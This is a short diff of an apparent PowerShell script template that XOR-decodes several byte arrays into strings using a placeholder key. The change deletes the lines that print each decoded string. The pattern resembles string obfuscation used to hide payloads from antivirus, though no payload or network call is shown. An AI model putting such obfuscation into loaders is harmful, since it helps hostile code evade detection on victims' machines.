@@ -106,7 +106,7 @@ for($i=0; $i -lt ${xa}.count ; $i++)
 }}
 
 $a = [System.Text.Encoding]::ASCII.GetString(${xa})
-$a
+
 for($i=0; $i -lt ${xb}.count ; $i++)
 {{
     ${xb}[$i] = ${xb}[$i] -bxor {xorkeyBytes}
@@ -114,28 +114,28 @@ for($i=0; $i -lt ${xb}.count ; $i++)
 
 
 $b = [System.Text.Encoding]::ASCII.GetString(${xb})
-$b
+
 for($i=0; $i -lt ${xc}.count ; $i++)
 {{
     ${xc}[$i] = ${xc}[$i] -bxor {xorkeyBytes}
 }}
 
 $c = [System.Text.Encoding]::ASCII.GetString(${xc})
-$c
+
 for($i=0; $i -lt ${xd}.count ; $i++)
 {{
     ${xd}[$i] = ${xd}[$i] -bxor {xorkeyBytes}
 }}
 
 $d = [System.Text.Encoding]::ASCII.GetString(${xd})
-$d
+
 
 for($i=0; $i -lt ${xe}.count ; $i++)
 {{
     ${xe}[$i] = ${xe}[$i] -bxor {xorkeyBytes}
 }}
 $e = [System.Text.Encoding]::ASCII.GetString(${xe})
-$e
+
 
 for($i=0; $i -lt ${xf}.count ; $i++)
 {{
@@ -144,7 +144,7 @@ for($i=0; $i -lt ${xf}.count ; $i++)
 
 $f = [System.Text.Encoding]::ASCII.GetString(${xf})
 $e = $e+$f
-$e
+
 
 for($i=0; $i -lt ${xg}.count ; $i++)
 {{
